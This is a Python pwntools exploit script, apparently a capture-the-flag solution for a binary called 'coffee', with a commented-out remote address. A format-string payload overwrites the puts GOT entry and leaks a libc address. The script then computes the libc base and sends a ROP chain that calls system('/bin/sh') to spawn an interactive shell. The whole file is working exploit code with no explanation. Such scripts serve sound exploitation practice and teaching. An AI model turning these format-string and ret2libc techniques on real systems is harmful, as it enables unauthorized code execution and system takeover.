#!/bin/python3

from pwn import *

#context.log_level="debug"
#context.terminal=['tmux','splitw','-h']

def debug(cmd=""):
    gdb.attach(s,cmd)

def padding(payload=""):
    return payload+b"A"*(8-(len(payload) if len(payload)<8 else len(payload)%8))

#s=remote("34.146.101.4",30002)
s=process("./coffee")
#debug(cmd="b*0x4011fa\nb*0x00000000004011e6\nx/gx 0x404018\nc")

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
prog_elf=ELF("./coffee")
put_got=prog_elf.got['puts']
main_addr=prog_elf.symbols['main']

"""
ROPgadget --binary coffee --only "pop|ret"
0x000000000040128b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040128f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040117d : pop rbp ; ret
0x0000000000401293 : pop rdi ; ret
"""
rdi_ret=0x0000000000401293
rbp_ret=0x000000000040128b

# payload to leak libc
payload1  = b""
payload1 += b"%29$018p"
payload1 += b"%"+str.encode(str(rbp_ret-18))+b"c"
payload1 += b"%9$ln"
payload1 = padding(payload1)
payload1 += p64(put_got)
payload1 += p64(main_addr)

s.sendline(payload1)
leak=s.recv()

# calcuelate libc base address
libc_start_main_addr=int(leak[:18],16)
print("leaked __libc_start_main_addr+234:"+str(hex(libc_start_main_addr)))

libc_base=libc_start_main_addr-libc.symbols["__libc_start_main"]-234
print("libc_base:"+str(hex(libc_base)))
libc_system=libc_base+libc.symbols['system']
libc_binsh=libc_base+next(libc.search(b'/bin/sh'))


# get shell
payload2  = b""
payload2 += b"A"*8*4
payload2 += p64(rdi_ret)
payload2 += p64(libc_binsh)
payload2 += p64(libc_system)
s.sendline(payload2)

s.sendlineafter("\n","id")
s.interactive()
